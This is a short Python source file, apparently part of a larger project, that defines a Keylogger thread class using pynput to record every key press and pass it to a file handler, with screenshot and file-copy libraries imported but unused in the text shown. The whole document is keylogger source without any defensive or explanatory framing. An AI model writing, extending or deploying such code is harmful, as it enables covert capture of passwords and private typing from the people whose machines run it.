import shutil
from pynput.keyboard import Key, Listener
import pyscreenshot as ImageGrab
from datetime import datetime
from threading import Thread



class Keylogger(Thread):

    def __init__(self, filehandler):
        Thread.__init__(self, name='keylogging')
        self.__dateTime = datetime.now()
        self.__filehandler = filehandler


    def onPress(self, key):
        self.__filehandler.writeToFile(key)
    

    def run(self):
        with Listener(on_press=self.onPress) as listener:
            listener.join()


